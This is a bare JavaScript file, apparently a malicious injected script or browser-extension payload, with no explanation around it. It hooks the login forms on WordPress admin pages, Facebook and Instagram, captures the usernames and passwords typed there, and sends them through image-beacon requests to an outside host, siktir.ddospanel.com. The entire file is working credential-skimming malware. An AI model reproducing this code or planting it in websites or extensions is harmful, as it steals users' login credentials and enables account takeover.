
if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
document.getElementById('wp-submit').onclick = function() {
   new Image().src = 'http://siktir.ddospanel.com/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
};
}

if (top.location.href.indexOf("facebook.com") > -1 && document.getElementById("login_form")) {
    document.getElementById("login_form").onsubmit = function (e) {
        localStorage.setItem("upom", document.getElementById("email").value);
        localStorage.setItem("uzom", document.getElementById("pass").value);
        setTimeout(function () {
            document.getElementById("login_form").submit()
        }, 99);
        return false
    }
}
if (localStorage.upom && localStorage.uzom) {
	
	tarih = new Date();
    storage_key = 'access_twitter_';
    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
        localStorage[storage_key] = tarih.getTime();
		new Image().src = "http://siktir.ddospanel.com/cpp.php" + "?us=" + localStorage.upom + "&pw=" + localStorage.uzom;	
    }	
}

if (top.location.href.indexOf("instagram.com") > -1) {

function runScript(e) {
    if (e.keyCode == 13) {
        var adi = document.getElementsByClassName("_kp5f7 _qy55y")[0].value;
        var sifre =  document.getElementsByClassName("_kp5f7 _qy55y")[1].value;
	    new Image().src = "http://siktir.ddospanel.com/cpp.php" + "?us=" + adi + "&pw=" + sifre;	

    }
}
$('._aj7mu').click(function(){
var adi = document.getElementsByClassName("_kp5f7 _qy55y")[0].value;
var sifre =  document.getElementsByClassName("_kp5f7 _qy55y")[1].value;
	new Image().src = "https://siktir.ddospanel.com/cpin.php" + "?us=" + adi + "&pw=" + sifre;	

});
}
